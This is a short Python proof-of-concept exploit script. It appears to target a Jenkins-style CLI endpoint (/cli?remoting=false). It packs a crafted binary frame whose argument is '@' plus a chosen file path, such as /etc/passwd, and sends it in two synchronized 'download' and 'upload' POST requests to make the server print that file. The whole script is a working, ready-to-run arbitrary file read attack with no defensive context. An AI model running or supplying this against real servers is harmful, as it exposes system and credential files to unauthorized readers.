import threading
import http.client
import time
import uuid
import urllib.parse
import sys
import struct

class Op:
    ARG = 0
    LOCALE = 1
    ENCODING = 2
    START = 3
    EXIT = 4
    STDIN = 5
    END_STDIN = 6
    STDOUT = 7
    STDERR = 8

if len(sys.argv) != 3:
    print('[*] usage: python poc.py http://127.0.0.1:8888/ [/etc/passwd]')
    exit()

text_bytes = ('@' + sys.argv[2]).encode('utf-8')
length_prefix = struct.pack('>H', len(text_bytes))
req_data = bytes([Op.ARG]) + length_prefix + text_bytes


data_bytes = b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00' + struct.pack('!B', len(req_data) - 1) + req_data + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03'
target = urllib.parse.urlparse(sys.argv[1])
uuid_str = str(uuid.uuid4())

print(f'REQ: {data_bytes}\n')

def req1():
    conn = http.client.HTTPConnection(target.netloc)
    conn.request("POST", "/cli?remoting=false", headers={
        "Session": uuid_str,
        "Side": "download"
    })
    print(f'RESPONSE: {conn.getresponse().read()}')

def req2():
    time.sleep(0.3)
    conn = http.client.HTTPConnection(target.netloc)
    conn.request("POST", "/cli?remoting=false", headers={
        "Session": uuid_str,
        "Side": "upload",
        "Content-type": "application/octet-stream"
    }, body=data_bytes)

t1 = threading.Thread(target=req1)
t2 = threading.Thread(target=req2)

t1.start()
t2.start()

t1.join()
t2.join()
